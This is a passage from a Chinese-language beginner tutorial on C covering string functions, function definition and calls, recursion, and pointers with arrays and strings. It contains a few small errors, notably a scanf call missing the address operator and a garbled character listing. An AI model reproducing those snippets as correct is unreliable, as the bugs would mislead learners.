s2)复制函数\n\n功能:将str2为首地址的字符串复制到str1为首地址的字符数组中\n\n注意:str1必须定义为字符数组或字符指针变量，且必须留有足够的空间，参数str2既可以为字符数组名，指向字符数组的指针，也可以是字符串常量\n\n举个例子\n\n```c\n#include <stdio.h>\n#include <string.h>\nint main(){\n\tchar str1[100]=\"abcbc\";\n\tchar str2[]=\"wan\";\n\tstrcpy(str1,str2);\n\tprintf(\"%s\",str1);\n\treturn 0;\n}\n/*\nwan\n*/\n```\n\n复制之后的结果是`wan\\0c\\0`，但是用printf函数进行输出的时候碰到结束符会结束输出，所以此时的输出结果就是wan\n\n### strcmp(str1,str2)比较函数\n\n将两个字符串str1和str2进行比较\n\n- 如果str1串和str2串相等，则返回值为0\n- 如果str1串大于str2串，则返回值>0\n- 如果str1串小于str2串，则返回值<0\n\n他们之间比较的规则就是，拿这两个str串上对应位置的字符的ASCII值进行比较，当遇到不相同的字符或者遇到结束符后结束\n\n这两个字符串既可以为字符数组名，指向字符数组的指针，也可以是字符串常量\n\n```c\n#include <stdio.h>\n#include <string.h>\nint main(){\n\tchar str1[]=\"wanth3f1ag\";\n\tchar str2[]=\"wanth3f1ag\";\n\t\n\tprintf(\"%d\",strcmp(str1,str2));\n\treturn 0;\n}\n```\n\n一般两个字符串直接不能直接进行比较，都需要用到这个函数去进行比较\n\n### strlwr(str)转小写函数\n\n将字符串中的大写字母转成小写字母\n\n### strupr(str)转大写函数\n\n将字符串中的小写字母转成大写字母\n\n讲完了字符数组和字符串的知识，接下来我们放几道比较经典的题目\n\n## 题目:删除指定字符\n\n要求从指定字符串中删除指定字符\n\n```c\n#include <stdio.h>\n#include <string.h>\nvoid removeCharacter(char *str, char ch) {\n    int i, j = 0;\n    \n    for (i = 0; i < strlen(str)-1; i++) {\n        if (str[i] != ch) { // 如果当前字符不是指定字符\n            str[j++] = str[i]; // 复制到新位置\n        }\n    }\n    str[j] = '\\0'; // 添加字符串结束符\n}\nint main(){\n\tchar str[100],n;\n\tint i,c;\n\tprintf(\"请输入想要处理的字符串:\\n\");\n\t\n\tfgets(str,sizeof(str),stdin);\n\t\n\tprintf(\"请输出需要删除的字符:\\n\");\n\t\n\tscanf(\"%c\",&n);\n\t\n\tremoveCharacter(str,n);\n\t\n\tprintf(\"%s\",str);\n\t\n\treturn 0;\n}\n```\n\n然后还有几个我认为很好用的字符串函数\n\n### strstr()查询字符串函数\n\nC 库函数 **char \\*strstr(const char \\*haystack, const char \\*needle)** 在字符串 **haystack** 中查找第一次出现字符串 **needle** 的位置，不包含终止符 **\\0**。\n\n基础语法\n\n```\nstrstr(str1,str2)//在str1中寻找第一次出现字符串str2的位置并返回该位置的指针\n```\n\n# C语言函数\n\n我们需要明确的一个思想就是，在解决一个复杂的问题的时候，我们需要把复杂的问题逐步分解为简单问题，然后将各类简单问题逐个解决，这是面向过程的思想，在面向过程的思想里我们可以知道，面向过程的思想主要运用的就是函数，而函数是C程序的基本组成单位\n\n例如我们需要设计图书管理系统，单看这个系统是很复杂且难以实现的，那么我们将图书管理系统的逐个细分为多个板块，每个板块处理一个功能，例如图书查询，图书借阅，用户管理等等，然后这些功能的实现如果还是过于复杂的话，我们还可以进一步细分，直到能轻松的编写出模块的代码，这里的模块就是我们的函数，每个函数实现特定的功能，最后将这些函数整合起来，统一调试和运行，就形成了一个完整的程序\n\nC语言程序的全部功能都是由函数去是实现的，每个函数相对独立且具有特定的功能，最终通过函数间的调用去实现完整的功能\n\n先写一个简单的函数声明和调用的例子\n\n```c\nreturn_type function_name(parameter list)\n{\n\tbody of the function\n}//函数声明\nint main(){\n\tfunction_name(parameter list);//函数的调用\n}\n```\n\n先具体说说main函数\n\n## main函数\n\n- 一个C源程序只能包含一个main函数，他是所有程序的起点，主程序都从main函数开始，在main函数结束\n- 在main函数中可以调用其他的函数，但是在其他函数中不能调用main函数。通常调用其他函数的函数称为主调函数例如main函数，被调用的函数称为被调函数\n- main函数可以在程序中的任意位置，这不影响主程序从main函数开始\n\n## 函数的分类\n\n不管怎么样，所有的函数都是平等的，且是互相独立的，即不能嵌套定义，函数可以单独编译但是不能单独运行\n\n- 从使用的角度来说我们可以把函数分成`标准函数`和`用户自定义函数`，标准函数也称`库函数或系统函数`，是指由系统预先定义好的，系统提供的函数例如printf输出函数和scanf输入函数，用户自定义函数就是用户在编写程序的时候为了实现某个特定功能而自主定义的函数\n- 从有无参数来说可以分成无参函数和有参函数\n- 从作用范围来说可以分成外部函数和内部函数，外部函数是指能可以被任意源程序文件中的函数所调用的函数，内部函数是指只能在函数所在的源程序文件中的函数所调用的函数\n- 从返回值来看可以分为有返回值函数和无返回值函数\n\n感觉这些都是概念问题，但是为了搭好基础，这些还是有必要写出来的\n\n## 函数的定义\n\n函数也是需要先定义后调用的，接下来我们具体说一下函数定义的格式\n\n```c\n//无参数函数的定义\n函数返回值类型 函数名()//函数头\n{\n\t[变量声明]\n    [语句执行]\n    return 表达式;//可选，根据有无设置返回值类型来定\n}//函数声明\n//有参数函数的定义\n函数返回值类型 函数名(形式参数数据类型，形式参数名1,形式参数数据类型，形式参数名2...)//函数头\n{\n\t[变量声明]\n    [语句执行]\n    return 表达式;//可选，根据有无设置返回值类型来定\n}\n```\n\n- **函数返回值类型：**一个函数可以返回一个值。 是函数返回的值的数据类型。有些函数执行所需的操作而不返回值，在这种情况下，函数返回值类型是关键字 **void**。如果我们省略不写的话这里默认就是int类型\n- **函数名：**这是函数的实际名称。函数名和参数列表一起构成了函数签名。\n- **形式参数：**形式参数就像是占位符。当函数被调用时，您向参数传递一个值，这个值被称为实际参数。形式参数包括函数参数的类型、顺序、数量。参数是可选的，也就是说，函数可能不包含参数。\n- **函数体：**函数主体包含一组定义函数执行任务的语句和变量。\n- **return：**根据前面设置的函数返回值类型来定，是可选的，如果类型是void的话意味着不需要返回值，那么就不需要写return语句，但是这里的return 表达式类型需要和函数返回值类型一致，如果没有一致的话系统会根据函数返回值类型去对return 语句中的表达式值进行转换,另外，`当函数中有多个return语句时，只会有一个return语句被执行`\n\n接下来我们简单的声明一个比大小的函数\n\n```c\n#include <stdio.h>\nint max(int x , int y)//两个形式参数\n{\n    int maxnum;//函数体内变量定义\n    if(x>y){\n        maxnum = x;\n    }else{\n        maxnum = y;\n    }//语句执行过程\n    return (maxnum);\n}//声明一个比大小的函数\n//因为这里需要返回大的数所以设置返回类型为int且用return去返回maxnum\n```\n\n## 函数的调用\n\n当函数定义完后，我们就要学会去调用函数了，这样才能实现函数的功能\n\n当我们程序按顺序执行的时候，碰到函数调用后就会跳到被调用的函数中去，当函数的返回语句被执行时，或到达函数的结束括号时，会把程序控制权交还给主程序。\n\n函数调用的方法\n\n```\n函数名(实际参数列表);//有参数调用\n函数名();//无参数调用\n```\n\n### 形式参数和实际参数\n\n- 形式参数：函数定义时候设定的参数\n\n形式参数就是我们在定义有参数函数的时候设定的传入函数的参数，在设定形式参数的时候需要写明每个参数对应的数据类型\n\n- 实际参数：调用函数时候使用的实际参数\n\n实际参数就是我们在调用有参函数的时候实际传入函数的参数\n\n需要注意以下几点：\n\n- 实参和形参要一一对应，不论是`参数个数还是参数数据类型都要一一对应`，例如定义void max(double x , int y)的函数，我们就不能传入int a和int b ，只能是double a ，int b；\n- 形参只能是变量，而实参可以是变量常量，函数和表达式等\n- 在内存分配上，形参定义的时候是不会分配内存的，`只是在调用参数的时候传入实参的时候形参才会临时分配内存`，不过在函数调用结束后形参的内存就会自动释放\n\n### 函数调用的方法\n\n- 直接以语句的方式进行函数调用例如`max(x,y);`的形式\n- 以表达式的形式让调用函数的返回值参与运算，才是被调函数必须有一个返回值\n- 以函数的参数形式进行调用，例如`func(func(x))`让内层函数的返回值作为外层函数的实参，此时内层函数必须有一个返回值\n\n## 函数的声明\n\n函数的使用遵循先定义后使用，如果我们在定义之前就调用函数，此时必须进行函数声明\n\n当被调函数的定义放在主调函数之后，且函数值的类型不是整数时，则应在对应函数调用语句之前对被调函数进行声明\n\n函数声明的格式\n\n```\n函数返回值类型 函数名(数据类型1,数据类型2...);\n或\n函数返回值类型 函数名(数据类型1 形参名1,数据类型2 形参名2...)\n```\n\n在函数声明中，参数的名称并不重要，只有参数的类型是必需的\n\n当我们在一个源文件中定义函数且在另一个文件中调用函数时，函数声明是必需的。在这种情况下，我们应该在调用函数的文件顶部声明函数。\n\n举个例子\n\n```c\n#include <stdio.h>\n//int max(int x , int y);\n//比大小程序 \nint main(){\n\tint a=0,b=0,m=0;\n\t\n\tprintf(\"请输入两个数并进行比大小\\n\");\n\t\n\tscanf(\"%d%d\",&a,&b);\n\t\n\tm=max(a,b);\n\t\n\tprintf(\"%d\",m); \n\t\n\treturn 0;\n}\nint max(int x , int y)//两个形式参数\n{\n    int maxnum=0;//函数体内变量定义\n    if(x>y){\n        maxnum = x;\n    }else{\n        maxnum = y;\n    }//语句执行过程\n    return (maxnum);\n}//声明一个比大小的函数\n//因为这里需要返回大的数所以设置返回类型为int且用return去返回maxnum\n```\n\n这里函数调用写在函数定义前，并且我没用对函数进行声明，那么这时候这段代码就是错误的，会产生报错\n\n![image-20250225164303923](../image/achieve/202411/C语言/image-20250225164303923.png)\n\n## 函数的参数传递方法\n\n### 值传递方式\n\n是指将实参的值单向传递给形参的传值调用方法\n\n传参过程\n\n在采用值传递的方式进行传参的时候，系统会将实参的值复制到形参相应的存储单元中(意味着在调用的时候只是形参在参与变化)，实参的内存单元空间和形参是不一样的且分配空间的时刻是不一样的。因此形参的变化不会影响实参的变化\n\n### 地址传递方式\n\n是指将实参的地址传递给形参，形参为指向实参地址的指针。这里强调实参一定是一个地址，例如数组名，指针\n\n传参过程\n\n在采用地址传递方式的时候，形参通常是数组或指针，此时把实参的地址传给形参，虽然函数调用的时候形参被临时分配了内存空间，但是形参操作的是实参的地址，意味着是对实参的内容进行调控，对形参的实际操作就是对实参的实际操作，所以形参的改变必然会引起实参的改变\n\n举个例子\n\n```c\n#include <stdio.h>\n//冒泡排序\n//冒泡排序函数定义\nvoid func(int a[],int n){\n\tint i,j,max=0;\n\tfor(i=0;i<n-1;i++){\n\t\tfor(j=0;j<n-i-1;j++){\n\t\t\tif(a[j]>a[j+1]){\n\t\t\t\tmax=a[j];\n\t\t\t\ta[j]=a[j+1];\n\t\t\t\ta[j+1]=max;\n\t\t\t}\n\t\t}\n\t}\n} \nint main(){\n\tint a[100],i,n=0;\n\tprintf(\"请输入需要排序的整数:\\n\");\n\tfor(i=0;i<100;i++){\n\t\tscanf(\"%d\",&a[i]);\n\t\tif(a[i]==-1){\n\t\t\tbreak;//输入-1停止输入 \n\t\t}\n\t\tn++; \n\t}\n\tfunc(a,n);\n\tprintf(\"排序后的结果是:\\n\");\n\tfor(i=0;i<n;i++){\n\t\tprintf(\"%-4d\",a[i]);\n\t}\n\treturn 0;\n}\n```\n\n这里可以看到当函数调用后我们的数组的顺序发生了改变，这就意味着地址传递确实可以对实参产生影响\n\n## 函数的嵌套调用和递归调用\n\n- 函数的嵌套调用\n\n上面说过，C语言中的函数是不允许嵌套定义的，但是C语言运行函数之间的嵌套调用\n\n函数的嵌套调用简单来说就是因为函数既可以被其他函数调用，也可以调用其他函数（main函数除外）\n\n执行过程：\n\n```\nmain主函数->fun1函数->fun2函数->fun1函数->main主函数\n```\n\n实操一下\n\n```c\n//最大公约数 (GCD) 是能同时整除多个整数的最大整数。\n//最小公倍数 (LCM) 是能被多个整数整除的最小整数。\n#include <stdio.h>\n//求最小公倍数 \nint fun2(int u,int v); \nint fun1(int n,int m){\n\tint lcm=0;\n\tlcm = n * m / fun2(n,m);\n\treturn (lcm);\n}\nint fun2(int u,int v){//求最大公约数 \n\tint t=0,r=0;\n\tif(v>u){\n\t\tt = u;\n\t\tu = v;\n\t\tv = t;\n\t}\n\twhile((r=u%v)!=0){\n\t\tu = v;\n\t\tv = r;\n\t}\n    return (v);\n}\nint main(){\n\tint num1=0,num2=0,lcm=0;\n\t\n\tprintf(\"请输入两个整数:\\n\");\n\t\n\tscanf(\"%d%d\",&num1,&num2);\n\tlcm = fun1(num1,num2);\n\tprintf(\"lcm = %d\",lcm);\n\treturn 0;\n}\n```\n\n- 函数的递归调用\n\n说白了就是嵌套调用中的一个特例，就是自己调用自己，但是这个递归调用是无止境的，因此需要在递归调用的时候使用结构语句设置调用的终止条件，否则会进入死循环\n\n格式\n\n```c\nvoid recursion()\n{\n   statements;\n   ... ... ...\n   recursion(); /* 函数调用自身 */\n   ... ... ...\n}\n \nint main()\n{\n   recursion();\n}\n```\n\n递归调用分为两种：1.一个是直接自己调用自己，例如`fun1->fun1`；2.一个是通过别的函数间接的调用自己，例如`fun1->fun2->fun1`\n\n接下来我们讲几个使用递归函数解决的算法问题\n\n## 问题:数的阶乘\n\n```c\n#include <stdio.h>\n//求某个数的阶乘x!\nint fun1(int x);\nint main(){\n\tint num=0;\n\tprintf(\"请输入想要求的阶乘的数:\\n\");\n\t\n\tscanf(\"%d\",&num);\n\t\n\tprintf(\"%d的阶乘是%d\",num,fun1(num));\n\treturn 0;\n}\nint fun1(int x){\n\tif(x<=1){\n\t\treturn 1;\n\t}else {\n\t\treturn x * fun1(x-1);\n\t}\n}\n```\n\n## 问题:Fibonacci数列plus\n\n```c\n#include <stdio.h>\nint Fibonacci(int x);\nint main(){\n\tint num=0;\n\tprintf(\"请输入要求的斐波那契数列的长度:\\n\");\n\t\n\tscanf(\"%d\",&num);\n\t\n\tfor(int i=0;i<num;i++){\n\t\tprintf(\"%-3d\",Fibonacci(i));\n\t}\n\t\n\treturn 0;\n}\nint Fibonacci(int x){\n\tif(x==0){\n\t\treturn 0;\n\t\t\n\t}else if(x==1){\n\t\t\n\t\treturn 1;\n\t\t\n\t}else {\n\t\treturn Fibonacci(x-1)+Fibonacci(x-2);\n\t}\n\t\n} \n```\n\n另外需要扩展两个函数的知识点\n\n## 内部函数和外部函数\n\n内部函数就是使用static去说明，使这个函数只能作用于此源文件，不能被其他源程序的函数所调用\n\n格式\n\n```\nstatic 函数类型说明符 函数名(形式参数列表)\n```\n\n外部函数跟内部函数相反，用extern去声明函数，使得函数可以在其他源程序的函数中被调用，跟全局变量的存储声明是一样的\n\n# C语言指针\n\n在前面讲变量的时候我们就涉及到了内存的操作，那么我们先来逐步进入指针的讲解\n\n## 内存地址\n\n在C语言中变量其实就是代表了内存中对应的存储单元，如果我们定义了变量，那么系统就会根据变量类型为变量开辟存储的空间，既然这样，那我们该如何去访问这些存储单元呢？其实这些存储单元都会有一个编号，就像我们在一家酒店里有很多个房间，每个房间都会有一个房间号，这个房间号就是所谓的内存地址\n\n内存中每个存储单元都会有一个对应的存储地址，而每个变量在编译的时候都会在内存中分配连续的一定字节数的存储单元，根据前面学到的，不同数据类型的变量的字节数是不一样的，所以其分配的存储单元大小也是不一样的。其中**`变量所分配到的存储单元的第一个字节的地址就是我们的内存地址`**\n\n例如我们定义一个整型变量a，在程序执行的时候就会在内存中分配4个字节给a，比如3001-3004，然后当我们赋值之后，变量的值就会存入这个4个字节 的存储空间。\n\n那我们怎么去查看变量的地址呢？这就涉及到一个取地址符&了，就拿上面的a来说，&a的输出结果就是3001，也就对应着这个变量存储空间的第一个字节的地址\n\n## 什么是指针？\n\n指针其实就是内存地址，存放内存地址的这种特殊变量就是指针变量，简称”指针“。\n\n指针也是会占有一定存储空间的，只不过其值是地址，可能是某个变量的地址，也可能是某个数组的首地址\n\n举个菜鸟教程的例子\n\n```c\n#include <stdio.h>\n \nint main ()\n{\n    int var_runoob = 10;\n    int *p;              // 定义指针变量\n    p = &var_runoob;\n \n   printf(\"var_runoob 变量的地址： %p\\n\", p);\n   return 0;\n}//var_runoob 变量的地址： 000000000062FE14\n```\n\n![img](../image/achieve/202411/C语言/c-pointer.png)\n\n这个图可以很清晰的看出来指针和变量的关系，个人感觉这个图还是不错的\n\n## 指针的定义\n\n格式\n\n```\n类型标识符 *指针变量名列表\n例如int *a,*b;\n```\n\n解释一下，这里的`*`号表示的是指针变量存放的是地址，这是一种特殊的变量\n\n另外，在定义指针变量的时候必须说明指针变量的数据类型，且一个指针变量对应只能指向同一种数据类型的变量的地址，因为不同数据类型的数据在内存中的字节数不同\n\n## 指针的引用\n\n引用指针之前我们必须学会这两个跟指针有关的字符`&`和`*`\n\n- 取地址运算符&\n\n顾名思义就是取变量的地址，是单目运算符，结合性从左到右\n\n- 指针运算符*\n\n又被称为\"取内容运算符\"，通过这个运算符可以取指针变量所指向的存储区存放的值，是单目运算符，结合性从右到左\n\n例如\n\n```c\n#include <stdio.h>\nint main(){\n\tint a = 10, *p;\n\tp = &a;\n\tprintf(\"a的首地址是: %x\\n\",p);\n\tprintf(\"a的首地址是: %x\\n\",&a);\n\tprintf(\"a的值是: %d\\n\",a);\n\tprintf(\"a的值是: %d\\n\",*p);\n\treturn 0;\n}\n/*\na的首地址是: 000000000062FE44\na的首地址是: 000000000062FE44\na的值是: 10\na的值是: 10\n*/\n```\n\n讲几个等价关系\n\n```\np等价于&a等价于&(*p)\na等价于10等价于*p等价于*(&a)\n```\n\n需要注意的是:\n\n1. 在定义指针的时候\\*号代表的是该变量为指针变量，而在引用指针的时候\\*则是代表取该指针指向变量的值\n2. 在引用指针之前一定要初始化赋值\n3. 不能将普通类型数据直接赋值给指针变量\n4. 指针变量赋值的时候类型一定要匹配，如果类型不匹配则需要进行类型转换\n5. C语言中可以定义空类型指针变量，例如void *p; \n\n## 指针的初始化\n\n简单来说就和变量一样，在定义的时候就可以给指针初始化赋值，例如`int a=10,*p=&a;`但是需要注意的是，指针变量的定义和初始化必须在变量定义之前，例如int *p=&a;int a=10;是错误的\n\n对于局部指针变量，在定义时候如果没有初始化，其指针值是不确定的，如果指针变量没有赋值或初始化的话指针是不能用的\n\n对于全局指针和静态指针，在定义时候如果没有初始化，系统会自动初始化为NULL，即整数0，等同于`'\\0'`。即空指针，表示不指向任何变量\n\n## 指针的运算\n\n指针的运算是针对指针变量指向的变量的地址值为对象进行的运算，通过地址的变化来改变指针所指向的对象。\n\n指针的运算包括赋值运算，指针的移动，两指针相减，指针的比较等\n\n### 赋值运算\n\n指针变量 = &变量;\n\n指针变量 = 指针变量;\n\n指针变量 = 0;\n\n指针变量 = NULL;\n\n### 指针移动\n\n指针移动一般就是指针变量重新赋值或对指针变量进行加减自增运算，使得指针变量指向另一个存储单元\n\n```\nint a=10,*p=&a;\np=p+n;//表示指针指向当前位置后方第n个同类型数据的位置，或者往后移动n个同样数据类型存储单元，下面同理分析\np=p-n;\np++;\np--;\n```\n\n但是这里要注意的是，不同数据类型的指针指向不同类型的变量地址，这时候移动的数据类型单元也是不一样的，例如此时有一个浮点型指针变量，此时指针变量p=p+2，那么就是往后移动了2个存储单元，也就是2*sizeof(float)=8个字节\n\n但是指针的移动通常适用于连续的存储空间，比如数组类型\n\n### 指针的相减(同数据类型)\n\n指针相减后的结果就是两个地址之间相差的存储单元个数。\n\n### 指针的比较\n\n通常是用来比比较两个地址之间的位置关系，一般指向后面的存储单元的指针都会大于指向前面的存储单元的指针，如果两个指针同时指向一个存储单元则说这两个指针相等\n\n我们试一下\n\n```c\n#include <stdio.h>\nint main(){\n\tint a = 10, *p = &a;//指针初始化1 \n\tint *p1;//指针初始化2 \n\tprintf(\"p = %p\\n\",p);\n\tp1 = p;\n\tprintf(\"p1 = %p\\n\",p1);\n\tp++;//自增 \n\tp1 = p1 + 2;//往后移动1 \n\tprintf(\"p = %p\\n\",p); \n\tprintf(\"p1 = %p\\n\",p1);\n\tprintf(\"p1 - p = %d\\n\",p1 - p);//指针相减\n\tif(p1>p){\n\t\tprintf(\"p1 的地址更大\\n\");\n\t} else printf(\"p 的地址更大\\n\");\n\treturn 0;\n}\n/*\np = 000000000062FE3C\np1 = 000000000062FE3C\np = 000000000062FE40\np1 = 000000000062FE44\np1 - p = 1\np1 的地址更大\n*/\n```\n\n## 指针变量作为函数参数\n\n之前在函数里面就讲过了地址传递的传参方式，在地址传递的方式下，对形参的操作也会引起实参的的改变\n\n将普通变量的地址传递给形参，形参必须是指针类型，指针作为函数参数进行传递，其实本质上还是值传递，只不过传过来的值是一个地址，此时形式参数和实际参数都将指向同一个存储单元\n\n## 指针与一维数组\n\n在数组中，数组的地址指的是数组所在连续存储空间中的起始地址，也就是第一个数组元素的地址，同样等价于数组名，数组名本身就是一个地址常量\n\n- 指向一维数组元素的指针\n\n就是用指针变量存放数组的首地址，定义基本是一样的，但是指针变量不只是能存放数组的首地址，数组的每一个数组元素的地址都可以通过指针去存放\n\n例如\n\n```c\n#include <stdio.h>\nint main(){\n\tint a[10],*p1,*p2;\n\tp1 = a;//或p1 = &a[0]\n\tp2 = &a[2];\n\tprintf(\"p1 = %p\\n\",p1);\n\tprintf(\"p2 = %p\\n\",p2);\n\treturn 0;\n}\n/*\np1 = 000000000062FE10\np2 = 000000000062FE18\n*/\n```\n\n同样在指针指向数组中也可以用相关的指针运算\n\n例如这里有一数组a，那么a+3的意思就是&a[3]\n\n如果指针变量p的值为&a[0],那么&a[i],a+i,和p+i是等效的\n\n但是需要注意，我们的数组名是固定不变的，所以a++等自增操作是做不了的\n\n关于数组元素的引用\n\n当我们定义了指向数组元素的指针后，就可以对数组元素及其元素地址进行访问\n\n1. 数组元素的地址表示可以使用指针运算，例如我们设置一个指针*p=a数组名，那么通过p++可以把指针指向的数组元素的地址指向a[1]的地址\n2. 数组元素的访问表示可以通过以下三种去进行:`*(p+n),*(a+5),a[5],p[5]`，前两种是指针表示法，后两种是下标表示法\n\n![54d6f0c02edd4ba748c8b115db6a882](../image/achieve/202411/C语言/54d6f0c02edd4ba748c8b115db6a882.jpg)\n\n对于数组名和指针变量来说，指针变量可以取代数组名进行操作，因为数组名代表的是一个地址常量，在定义后就已经确定下来无法改变，一旦确定，就不能再指向其他地方，而指针变量是可以灵活改变值的。\n\n> [!WARNING]\n>\n> 对于`*(p++)`和`*(p+i)`来说，前者在运算的时候指针变量p都会发生改变即指针移动，而后者在运算的时候不会影响p自身，即指针不会发生移动。\n\n常见的指针表达式\n\n```\n*(p++) // 先引用指针p指向的元素值，然后p指向下一个元素的地址\n*(++p) // 先让指针p指向下一个元素的地址，然后再取值\n*(p--) // 先引用指针p指向的元素值，然后p指向上一个元素的地址\n*(--p) // 先让指针p指向上一个元素的地址，然后再取值\n*p++ // 和*(p++)等价\n*p-- // 和*(p--)等价\n(*p)++ // 将指针p指向的元素值进行自增\n(*p)-- // 将指针p指向的元素值进行自减\n++(*p) // 等价\n--(*p) // 等价\n```\n\n实操一下就知道了\n\n```c\n#include <stdio.h>\nint main(){\n\tint a[] = {1,2,3,4,5},*p; \n\tp = a;\n\tprintf(\"*p的结果是%d\\n\",*p);\n\tprintf(\"*(p++)的 结果是%d\\n\",*(p++));\n\tprintf(\"此时*p的结果是%d\\n\",*p);\n\tprintf(\"*(++p)的结果是%d\\n\",*(++p));\n\tprintf(\"此时*p的结果是%d\\n\",*p);\n\tprintf(\"++(*p)的结果是%d\\n\",++(*p));\n\tprintf(\"(*p)++的结果是%d\\n\",(*p)++);\n\tprintf(\"*p的结果是%d\\n\",*p);\n\treturn 0;\n}\n/*\n*p的结果是1\n*(p++)的结果是1\n此时*p的结果是2\n*(++p)的结果是3\n此时*p的结果是3\n++(*p)的结果是4\n(*p)++的结果是4\n*p的结果是5\n*/\n```\n\n在上面这个程序中，`*(p++)和*(++p)`是对地址进行操作，而`(*p)++和++(*p)`是对指针指向的元素值进行操作，这些区别仅仅在于自增自减的前后运算。\n\n指向数组的指针作为函数参数\n\n- 指针与数组名作为函数参数的区别\n\n本质上没区别，例如`func(int *str,int a)和func(int str[],int a )`完全等价\n\n![dfee97e39c59aee86d317c3cdc092a8](../image/achieve/202411/C语言/dfee97e39c59aee86d317c3cdc092a8.jpg)\n\n实参数组名表示一个地址常量，代表一个固定的地址，但是形参数组并不是一个固定的地址值，而是作为一个指针变量，在函数调用开始时，形参为实参数组首地址，在函数执行期间，它可以再被赋值\n\n## 指针与二维数组\n\n既然指针可以指向一维数组那么也就同样可以指向二维数组。接下来我们先做一个实验\n\n```c\n#include <stdio.h>\n//查看二维数组的数组首地址和第一个数组元素的地址是否相同\nint main(){\n\tint a[1][2] = {1,2};\n\tprintf(\"二维数组a的首地址为%p\\n\",a);\n\tprintf(\"二维数组元素a[0][0]的地址为%p\",&a[0][0]);\n\treturn 0;\n}\n/*\n二维数组a的首地址为000000000062FE40\n二维数组元素a[0][0]的地址为000000000062FE40\n*/\n```\n\n可以看到数组名对应的地址常量和`a[0]][0]`第一个元素对应的地址是一样的\n\nC语言规定:二维数组的首地址就是数组所在连续存储空间的起始地址，也就是数组首元素对应的地址。\n\n因为二维数组可以看成是若干个一维数组组成，例如`a[3][4]`就可以看成是`a[0],a[1],a[2]`三个一维数组来组成，那么既然前面的是一维数组名，那么就可以表示成二维数组每行的首地址，接下来我们继续探讨\n\n从二维数组的角度去观察，我们再写个程序\n\n```c\n#include <stdio.h>\nint main(){\n\tint a[1][2] = {1,2};\n\tprintf(\"二维数组a的首地址为%p\\n\",a);\n\tprintf(\"二维数组a第二行的首地址为%p\",a+1);\n//\tprintf(\"二维数组a的首地址为%p\\n\",a[0]);等价a\n//\tprintf(\"二维数组a第二行的首地址为%p\",a[1]);等价a+1\n\treturn 0;\n}\n/*\n二维数组a的首地址为000000000062FE40\n二维数组a第二行的首地址为000000000062FE48\n*/\n```\n\n可以看到a+n可以表示二维数组第n行的地址，从`a[0]`到`a[1]`跨过了两个存储单元即8个字节\n\n从一维数组可以看出，`a[i]`等价于`*(a+i)`,那么`a[i]+j`就等价于`*(a+i)+j`\n\n- 二维数组`a[i][j]`的地址`&a[i][j]`表示方法\n\n```c\n&a[i][j]//a[i][j]元素对应的地址\na[i]+j//a[i]表示二维数组第i+1行的首地址，+j表示把地址往后移j位，指向a[i][j]\n*(a+i)+j//*(a+i)为指向第i行第一个元素的指针，然后+j效果同上\n&a[0][0]+i*4+j\na[0]+4*i+j\n```\n\n- 二维数组`a[i][j]`的元素引用方法\n\n```c\na[i][j]//a[i][j]的值\n*(a[i]+j)//\n*(*(a+i)+j)\n*(&a[0][0]+i*4+j)\n*(a[0]+4*i+j)\n```\n\n这里有点绕但是一定要努力想明白\n\n**`*(a+i)`**：解引用操作符`*`用于获取指针指向的值。在这里，`*(a+i)`获取的是第`i`行的起始地址处的值，这个值本身（由于`a`是二维数组的指针）可以被视为指向第`i`行第一个元素的指针（即一个指向具有`n`个元素的数组的指针）。\n\n接下来到指向二维数组的指针变量\n\n- 指向二维数组元素的指针变量\n\n和普通的指针变量的定义是一样的\n\n例如\n\n```\nint a[3][4],*p1,*p2;\np1 = a[0];\np2 = &a[0][0];\n//这两个等价\n```\n\n- 指向由m个元素组成的一维数组的行指针变量\n\n格式\n\n```c\n数据类型 (*p)[m];\n例如 \nint a[3][4],(*p)[4];//定义一个指向含4个元素的一维数组的行指针p\np = a;\n```\n\n- `int (*p)[4]` 定义的是一个指向含有 4 个 `int` 元素数组的指针，而不是一个指针数组。\n\n这里p只能指向一个包含4个元素的一维数组，也就是上面 说的二维数组a中的`a[1]`或`a[0]`等，而不能指向数组元素。所以p只能对数组行进行操作，不能对行中某个数组元素进行操作\n\n如果通过p对数组元素进行操作的话，可以用以下形式进行访问`a[i][j]`元素\n\n1. `p[i][j]`\n2. `*(p[i]+j)`\n3. `*(*(p+i)+j)`\n4. `(*(p+i))[j]`\n\n## 指针和字符串\n\n之前在前面就说过，我们定义字符串常量的方法有两种，第一种是字符数组，第二种是字符指针，之前在前面讲过字符数组，这里就讲一下字符指针\n\n### 字符指针\n\n我们可以通过定义一个指向字符串的指针变量，利用该指针变量对字符串进行操作\n\n定义格式\n\n```\nchar *字符指针变量名;\n例如\nchar *str1 = \"wanth3f1ag\",*str2;\n```\n\n例子中的字符串常量\"wanth3f1ag\"会按字符数组进行处理，在内存中开辟一段连续的内存空间来存放字符串，并把存放该字符串的内存空间首地址赋给字符指针str1，所以我们这里的正确理解是这样的\n\n当我们使用字符指针的时候，所有的字符串处理函数的参数都应使用字符指针，例如puts(str1)。\n\n### 字符数组和字符指针的比较\n\n这两个虽然都能存储字符串并进行操作，但是两者还是有区别的\n\n- 存储方式比较\n\n当我们用字符数组进行处理字符串的时候，会将字符串各字符依次放入数组元素中(包括结束符'\\\\0'),例如上面的字符串\"wanth3f1ag\"在字符数组中是`str[]={'w','a','t','h','3','f','1','a','g','\\0'}`\n\n当我们用字符指针进行处理字符串的时候，因为字符指针本身就是一个存放地址的指针变量，其中存放的首地址就是字符串的首地址，而不是把整个字符串存放到字符指针变量中。而字符串常量是存放在内存的一段连续存储空间中，以结束符为串结束标志。字符串常量返回内存中存放字符串的内存空间的首地址\n\n- 赋值方式比较\n\n对字符数组操作只能对各个元素赋值或在字符数组定义时进行初始化，例如\n\n```c\nchar str[]=\"wanth3f1ag\";//定义的时候进行初始化\nchar str[10];\nfor(int i =0;i<10;i++){\n\tscanf(\"%c\",str[i]);//对各个元素赋值\n}\n但是以下形式是错误的\nchar str[16];\nstr = \"wanth3f1ag\";\n```\n\n但是对字符指针操作的时候上面错误方法就可以用\n\n```c\nchar *str;\nstr = \"wanth3f1ag\";\n```\n\n- 定义和输入比较\n\n定义一个数组后，系统会为每个数组元素分配具体的内存单元，各单元有确切的地址\n\n定义一个指针后，系统会分配一个存储地址单元，其中可以存放地址值，该指针可以指向一个字符型数据,但是如果没有赋以一个具体的地址的时候，指针并未指向任何字符数据\n\n所以在使用字符指针处理字符串的时候一定要对指针进行初始化，使得指针指向待处理的字符串，然后再进行操作和处理\n\n讲完了字符指针，这里还有一个很重要的知识点\n\n## 字符串处理函数的定义\n\n之前在字符数组的章节中讲到了很多字符串处理函数，其实这些函数的参数都是以指针的形式给出的\n\n- 